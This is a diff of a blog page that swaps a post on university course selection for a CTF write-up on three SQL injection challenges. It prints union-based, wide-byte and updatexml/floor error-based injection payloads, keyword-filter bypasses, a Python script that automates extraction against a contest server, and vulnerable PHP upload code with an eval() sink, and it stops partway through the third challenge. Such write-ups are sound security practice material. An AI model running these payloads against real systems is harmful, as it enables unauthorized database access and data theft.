@@ -6,20 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://k1ng0fic3.github.io">
-  <title>大三选课心得 | 冰皇&#39;s blog</title>
+  <title>SQL注入三连 | 冰皇&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="关于大三的选修课[虚拟化与云计算]优先级+++，到课什么的完全可以不管，临最后交一个小作业一个大作业就过了。总之能选一定要选！ [移动智能终端安全技术①]优先级++，经历了刘佳佳，杨超两代人的咕咕咕，这个课由360的工程师代上，上课内容：点点点，所以可以不去了。稍微有点Web安全基础的期末卷子就是满分，就算没有基础，背一下他们搞得学习网站上几张PPT，起码80+吧。 [网络程序设计]优先级+，大作">
+  <meta name="description" content="SQL注入练习三连为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目感谢颖奇师傅博客的帮助。 题目内容：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="大三选课心得">
-<meta property="og:url" content="https://k1ng0fic3.github.io/2020/01/10/%E5%A4%A7%E4%B8%89%E9%80%89%E8%AF%BE%E5%BF%83%E5%BE%97/index.html">
+<meta property="og:title" content="SQL注入三连">
+<meta property="og:url" content="https://k1ng0fic3.github.io/2020/01/31/SQL%E6%B3%A8%E5%85%A5%E4%B8%89%E8%BF%9E/index.html">
 <meta property="og:site_name" content="冰皇&#39;s blog">
-<meta property="og:description" content="关于大三的选修课[虚拟化与云计算]优先级+++，到课什么的完全可以不管，临最后交一个小作业一个大作业就过了。总之能选一定要选！ [移动智能终端安全技术①]优先级++，经历了刘佳佳，杨超两代人的咕咕咕，这个课由360的工程师代上，上课内容：点点点，所以可以不去了。稍微有点Web安全基础的期末卷子就是满分，就算没有基础，背一下他们搞得学习网站上几张PPT，起码80+吧。 [网络程序设计]优先级+，大作">
+<meta property="og:description" content="SQL注入练习三连为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目感谢颖奇师傅博客的帮助。 题目内容：">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-01-10T01:45:07.260Z">
-<meta property="article:modified_time" content="2020-01-13T16:36:01.659Z">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql1.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql2.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql3.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql4.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql28.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql29.png">
+<meta property="article:published_time" content="2020-01-31T13:30:24.937Z">
+<meta property="article:modified_time" content="2020-02-01T10:20:03.973Z">
 <meta property="article:author" content="冰皇">
-<meta property="article:tag" content="随笔">
+<meta property="article:tag" content="Web，宝可梦，取证">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://k1ng0fic3.github.io/images/sql1.png">
   
     <link rel="alternative" href="/atom.xml" title="冰皇&#39;s blog" type="application/atom+xml">
   
@@ -159,35 +166,199 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-大三选课心得" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-SQL注入三连" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      大三选课心得
+      SQL注入三连
     </h1>
   
 
         
-        <a href="/2020/01/10/%E5%A4%A7%E4%B8%89%E9%80%89%E8%AF%BE%E5%BF%83%E5%BE%97/" class="archive-article-date">
-  	<time datetime="2020-01-10T01:45:07.260Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-10</time>
+        <a href="/2020/01/31/SQL%E6%B3%A8%E5%85%A5%E4%B8%89%E8%BF%9E/" class="archive-article-date">
+  	<time datetime="2020-01-31T13:30:24.937Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="关于大三的选修课"><a href="#关于大三的选修课" class="headerlink" title="关于大三的选修课"></a>关于大三的选修课</h2><h3 id="虚拟化与云计算"><a href="#虚拟化与云计算" class="headerlink" title="[虚拟化与云计算]"></a>[虚拟化与云计算]</h3><p>优先级+++，到课什么的完全可以不管，临最后交一个小作业一个大作业就过了。总之能选一定要选！</p>
-<h3 id="移动智能终端安全技术①"><a href="#移动智能终端安全技术①" class="headerlink" title="[移动智能终端安全技术①]"></a>[移动智能终端安全技术①]</h3><p>优先级++，经历了刘佳佳，杨超两代人的咕咕咕，这个课由360的工程师代上，上课内容：点点点，所以可以不去了。稍微有点Web安全基础的期末卷子就是满分，就算没有基础，背一下他们搞得学习网站上几张PPT，起码80+吧。</p>
-<h3 id="网络程序设计"><a href="#网络程序设计" class="headerlink" title="[网络程序设计]"></a>[网络程序设计]</h3><p>优先级+，大作业交上就有40分，学的是socket+Linux编程基础，期末卷子是（选择+简答+编程）背一下往年卷子几个简答题，再背一下TCP+UDP编程模板，就差不多了。</p>
+        <h1 id="SQL注入练习三连"><a href="#SQL注入练习三连" class="headerlink" title="SQL注入练习三连"></a>SQL注入练习三连</h1><h5 id="为了躲肺炎，在XCTF平台中の安恒杯-新春祈福赛中，找到了三个比较好的SQL注入题目"><a href="#为了躲肺炎，在XCTF平台中の安恒杯-新春祈福赛中，找到了三个比较好的SQL注入题目" class="headerlink" title="为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目"></a>为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目</h5><p>感谢颖奇师傅<a href="https://www.gem-love.com" target="_blank" rel="noopener">博客</a>的帮助。</p>
+<h3 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h3><p><img src="https://k1ng0fic3.github.io/images/sql1.png" alt="avatar"></p>
 <a id="more"></a>
-<h3 id="软件逆向工程"><a href="#软件逆向工程" class="headerlink" title="[软件逆向工程]"></a>[软件逆向工程]</h3><p>真的难，背Windows API的痛苦，背DLL注入，API钩取等等代码的痛苦，最后勉强过了。我们这一级有人弃考了这一门，慎选吧反正，不过孙聪给分还可以。（bin组的同学可以无视这些）</p>
-<h3 id="高级语言程序设计"><a href="#高级语言程序设计" class="headerlink" title="[高级语言程序设计]"></a>[高级语言程序设计]</h3><p>Java，考的还挺恶心的，但是过还是挺好过的，孙聪给分算比较痛快。</p>
-<h3 id="网络协议分析与设计"><a href="#网络协议分析与设计" class="headerlink" title="[网络协议分析与设计]"></a>[网络协议分析与设计]</h3><p>到课要注意一下，大概有三次随堂作业。自认为不算很难学的一门课，我们那届考的题比较奇怪，跟往年题不怎么搭，建议把PPT和上课有意提到的重点爬一遍。</p>
-<h3 id="编译原理"><a href="#编译原理" class="headerlink" title="[编译原理]"></a>[编译原理]</h3><p>有一说一，这个课可以选，平时作业和实验验收都整完就有了50分，也就是说平时分就占了一半，老师讲课水平也相当不错，可能课稍微难点。我没选这个课，舍友反馈非常好，期末复习就看上课的录播就好。</p>
-<h3 id="数字信号处理"><a href="#数字信号处理" class="headerlink" title="[数字信号处理]"></a>[数字信号处理]</h3><p>真……真的勇士，敢于直面DSP？</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql2.png" alt="avatar"></p>
+<p><img src="https://k1ng0fic3.github.io/images/sql3.png" alt="avatar"></p>
+<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><h4 id="0x00：Babysqli-v1-0"><a href="#0x00：Babysqli-v1-0" class="headerlink" title="0x00：Babysqli v1.0"></a>0x00：Babysqli v1.0</h4><p>这是一道MD5比较bypass的题。<br>先回忆一下关于万能密码的注入基本原理：<code>select * from user where name =a&#39; or 1=1</code>查询结果因为<code>or 1=1</code>永远为真。所以整条语句返回<code>True</code>证明查询成功，并可以实现成功登录。<br>跟这道题关系不是很大。<br>fuzz时随便测试账号密码，返回wrong pass，查看源代码。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql4.png" alt="avatar"></p>
+<p>发现有注释信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">base32解码得：</span><br><span class="line">&#96;&#96;&#96;c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>base64解码得：</p>
+<figure class="highlight plain"><figcaption><span>* from user where username </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">测试表明name可注，过滤了and和&#x3D;</span><br><span class="line"></span><br><span class="line">测试列数：</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql5.png)</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql6.png)</span><br><span class="line"></span><br><span class="line">为三列，并且测试出用户名必须为admin，并且位于第二列。</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql7.png)</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql8.png)</span><br><span class="line"></span><br><span class="line">猜测分别为ID，user，和passwd的功能。</span><br><span class="line"></span><br><span class="line">题目没有给出源码，盲猜大概逻辑如下：</span><br></pre></td></tr></table></figure>
+<?
+$name = $_POST['name'];
+$passwd = md5($_POST['pw']);
+
+$sql = "select * from user where username = '$name'";
+$query = mysql_query($sql);
+
+if (!strcasecmp($passwd, $query[passwd])) {
+    echo $flag;
+} else {
+    echo("Wrong Pass");
+}
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">将查询出来的passwd和输入的密码的md5值比较，相等则登录成功不相等则返回wrong pass</span><br><span class="line"></span><br><span class="line">解题思路是：既然name参数可注，我们可以构造sql语句使其查询为假，然后联合查询出一个比如&#96;&#96;&#96;e5ff986d9dc5feb884fad249a4dee66d&#96;&#96;&#96;(binghuang的md5)，然后密码输入&#96;&#96;&#96;binghuang&#96;&#96;&#96;，就会查询成功。</span><br><span class="line"></span><br><span class="line">但是binghuang的md5肯定不在数据库里，该如何select出来？</span><br><span class="line">很简单，联合查询时，当查询的数据不存在的时候，就会构造一个虚拟的数据来。</span><br><span class="line">测试过程：</span><br></pre></td></tr></table></figure>
+create database test;   #创建一个数据库
+use test                #使用test数据库
+create table user( id int, username varchar(20), password varchar(20) );  #创建表
+select * from user;          #从表中查询所有,发现什么都没有
+select * from user where username = '0' and 1=2 union select 0,'admin','123456';  #发现从表中居然返回了数据,因此可绕过
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">关于过滤，and可以用大小写绕过，使查询错误时用不等于代替等于即可。</span><br><span class="line">payload：</span><br><span class="line">&gt;name&#x3D;admin&#39; And 1&gt;2 union select &#39;1&#39;,&#39;admin&#39;,&#39;e5ff986d9dc5feb884fad249a4dee66d&amp;pw&#x3D;binghuang</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql9.png)</span><br><span class="line"></span><br><span class="line">#### 0x01：Babysqli v2.0</span><br><span class="line"></span><br><span class="line">一开始发现输入admin和任何密码都会登录成功但是明显没有flag，说明登录成功的不是目标位置。</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql10.png)</span><br><span class="line"></span><br><span class="line">You can really dance~</span><br><span class="line"></span><br><span class="line">稍微联想一下就知道了，中文网站 → UTF8 → 宽字节注入，测试%df&#39;发现报错，判断成功：</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql11.png)</span><br><span class="line"></span><br><span class="line">解决方案大概有&#96;&#96;&#96;updatexml()&#96;&#96;&#96;报错注入、&#96;&#96;&#96;floor()&#96;&#96;&#96;报错注入、布尔盲注等等办法</span><br><span class="line">题中过滤了union、select、where等关键字，双写就可以绕过。</span><br><span class="line"></span><br><span class="line">##### &#96;&#96;&#96;updatexml()&#96;&#96;&#96;报错注入原理：</span><br><span class="line">&gt;updatexml (XML_document, XPath_string, new_value);</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;updatexml()&#96;&#96;&#96;函数的第二个参数为&#96;&#96;&#96;XPath_string&#96;&#96;&#96;，但是我们将&#96;&#96;&#96;concat()&#96;&#96;&#96;作为第二个参数传给&#96;&#96;&#96;updatexml()&#96;&#96;&#96;函数时，&#96;&#96;&#96;concat()&#96;&#96;&#96;返回类型为字符串所以不满足&#96;&#96;&#96;XPath_string&#96;&#96;&#96;格式，返回&#96;&#96;&#96;XPath syntax error&#96;&#96;&#96;，进而爆出数据库信息。</span><br><span class="line"></span><br><span class="line">&lt;1&gt; 数据库名</span><br><span class="line">&gt;name&#x3D;admin%df&#39; and updatexml(1,concat(1,database()),1) --+&amp;pw&#x3D;123</span><br><span class="line"></span><br><span class="line">得到数据库名为&#96;&#96;&#96;web_sqli</span><br></pre></td></tr></table></figure>
+
+![avatar](https://k1ng0fic3.github.io/images/sql12.png)
+
+注意：一般的exp都是```concat()```拼接上一个字符'```~```'，编码为```0x7e```，本题fuzz发现hex被过滤了，所以```concat()```里直接拼个1算了，本题中没有影响。
+加'```~```'是因为```updatexml()```会报错字母和特殊字符之后的内容，所以手工补上一个特殊字符'```~```'
+
+![avatar](https://k1ng0fic3.github.io/images/sql13.png)
+
+<2> 表名
+>name=admin%df' and updatexml(1,concat(1, (sselectelect group_concat(table_name) from information_schema.tables whwhereere table_schema=database() limit 0,1)),1) --+&pw=123
+
+得到f14g,user两个表。
+
+![avatar](https://k1ng0fic3.github.io/images/sql14.png)
+
+<3> 列名
+>name=admin%df' and updatexml(1,concat(1, (seselectlect group_concat(column_name) from information_schema.columns  wherwheree TABLE_SCHEMA=database() and TABLE_NAME=f14g)),1) --+&pw=123
+
+注意：表名```f14g```需要编码后请求，否则会返回```Error: Unknown column 'f14g' in 'where clause'```错误。本题目ban掉了hex，但是可以用```char()```编码实现。
+更正为：
+>name=admin%df' and updatexml(1,concat(1, (seselectlect group_concat(column_name) from information_schema.columns  wherwheree TABLE_SCHEMA=database() and TABLE_NAME=char(102,49,52,103))),1) --+&pw=123
+
+得到：
+
+![avatar](https://k1ng0fic3.github.io/images/sql15.png)
+
+附：其实如果没有想起来```char()```编码，不指定```f14g```直接```where table_schema=database()```查所有字段，得到的也是上图结果。
+
+图中的```b80bb7740288fda1f201890375a60c8f```是```id```的MD5值，试着查了一下，也都是数字。
+那么盲猜表里有一个```flag```的列，```flag```的MD5值为```327a6c4304ad5938eaf0efb6cc3e53dc```
+
+<4> 字段
+>name=admin%df' and updatexml(1,concat(1, (seleselectct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 0,1),1),1) --+ &pw=123
+
+![avatar](https://k1ng0fic3.github.io/images/sql16.png)
+
+对```VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr```解base64得：
+
+![avatar](https://k1ng0fic3.github.io/images/sql17.png)
+
+这xxd一看就是co某dance歌词，隐写的思维，直接往最后看。
+
+>name=admin%df' and updatexml(1,concat(1, (seleSELECTct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),1),1) --+ &pw=123
+
+得到：```R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0```解base64发现结果不全
+
+![avatar](https://k1ng0fic3.github.io/images/sql18.png)
+
+出现这种问题的原因是```updatexml()```限制长度为32位，超过32位的被丢弃了，所以上面无论是歌词还是flag，base64都经常缺个尾巴。
+解决方法是用```substr()```它可以指定从字符串的某个位置开始，返回自定义长度：
+>name=admin%df' and updatexml(1,concat(1, substr((seleselectct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)),1) --+ &pw=123
+
+![avatar](https://k1ng0fic3.github.io/images/sql19.png)
+
+得到```Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0=```，把它和```R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0```对比一下，整合得到```R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0=```解base64，完毕。
+
+![avatar](https://k1ng0fic3.github.io/images/sql20.png)
+
+这个时候回想一下，是不是在f14g表中，也可以用这个办法查出flag列的信息呢，哈哈
+
+<5> 转载工具
+看了下*Nepnep*师傅们的WP，给出了一个updatexml的自动化脚本，转发以宣传之。
+作者Shana、7TNE7，[原文链接](http://www.qfrost.com/PWN/GXY_CTF_2019/)
+<figure class="highlight plain"><figcaption><span>requests</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;183.129.189.60:10006&#x2F;search.php&#x2F;search.php?name&#x3D;admin%df&#39; and updatexml(1,concat(unhex(60),( substr((selselectect group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g),&#123;&#125;,32)),unhex(60)),1)--+&amp;pw&#x3D;123&quot;</span><br><span class="line">num &#x3D; 1</span><br><span class="line">regularFilterStr &#x3D; r&quot;Error: XPATH syntax error: &#39;&#96;(.+?)&#39;&quot;</span><br><span class="line">allBase64Str &#x3D; &#39;&#39;</span><br><span class="line">while 1:</span><br><span class="line">    payload &#x3D; url.format(num)</span><br><span class="line">    num &#x3D; num+31</span><br><span class="line">    response &#x3D; requests.get(payload)</span><br><span class="line">    html &#x3D; response.text</span><br><span class="line">    if &#39;&#96;&#39; in re.findall(regularFilterStr,html)[0]:</span><br><span class="line">        break</span><br><span class="line">    allBase64Str +&#x3D; re.findall(regularFilterStr,html)[0]</span><br><span class="line"></span><br><span class="line">lists &#x3D; allBase64Str.split(&#39;,&#39;)</span><br><span class="line"></span><br><span class="line">for i in lists:</span><br><span class="line">     print(base64.b64decode(i))</span><br></pre></td></tr></table></figure>
+
+##### ```floor()```报错注入原理：
+
+已经废话太多了就不再啰嗦了，参考一下[这个链接](https://blog.csdn.net/qq_39101049/article/details/88839514)，照着打就行。
+最终的payload：
+>name=%df'and(seselectlect 1 from(sselectelect count(\*),concat((sselectelect (sselectelect  concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1) from information_schema.tables limit 0,1),floor(rand(0)\*2))x from information_schema.tables group by x)a)--+&pw=123
+
+![avatar](https://k1ng0fic3.github.io/images/sql21.png)
+
+#### 0x02：Babysqli v3.0
+
+其实不是SQL注入，原意是phar反序列化的题，但是非预期很多而且非预期比较简单，还是从正常解开始。
+
+关于phar反序列化有一篇特别好的[总结](https://www.cnblogs.com/BOHB-yunying/p/11504051.html)，必须分析。
+
+首先弱口令或者字典爆破登录进平台（admin&password）
+然后跳转到了URL：```http://183.129.189.60:10009/home.php?file=upload```上
+
+![avatar](https://k1ng0fic3.github.io/images/sql22.png)
+
+这种情况就扫一下:共flag.php upload.php home.php index.php四个，直接访问flag.php无回显，也无法文件读取，其他文件会自动加上后缀```.fxxkyou!```且00截断无效。
+
+![avatar](https://k1ng0fic3.github.io/images/sql23.png)
+
+![avatar](https://k1ng0fic3.github.io/images/sql24.png)
+
+测试结果：若包含的文件以```home```或```upload```结尾，则在后面拼接上```.php```后包含；其他都被拼接上```.fxxkyou!```
+
+那么根据提示读upload：```http://183.129.189.60:10009/home.php?file=php://filter/convert.base64-encode/resource=upload```
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">	public $Filename;</span><br><span class="line">	public $cmd;</span><br><span class="line">	public $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">		$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">		@mkdir($sandbox, 0777, true);</span><br><span class="line">		if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">		$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function upload($file)&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line"></span><br><span class="line">		if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString()&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line">		&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">		return $this-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		eval($this-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">	$uploader &#x3D; new Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">	if(@file_get_contents($uploader))&#123;</span><br><span class="line">		echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+##### 预期
+
+在```upload```中
+>\$this->Filename = \$_GET['name'];
+
+可见```$this->Filename```是可控的，可以通过```name```参数以get方式得到。
+
+分析最后上传部分：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(@file_get_contents($uploader))&#123;</span><br><span class="line">	echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo file_get_contents($uploader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由于&#96;&#96;&#96;__destruct()方法&#96;&#96;&#96;中，想要&#96;&#96;&#96;eval($this-&gt;cmd);&#96;&#96;&#96;的前提条件是&#96;&#96;&#96;$this-&gt;token&#96;&#96;&#96;和&#96;&#96;&#96;$_SESSION[&#39;user&#39;]&#96;&#96;&#96;相等。</span><br><span class="line"></span><br><span class="line">在&#96;&#96;&#96;__construct()&#96;&#96;&#96;方法中有以下两行</span><br></pre></td></tr></table></figure>
+$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
+$this->Filename = $sandbox.$_SESSION['user'].$ext;
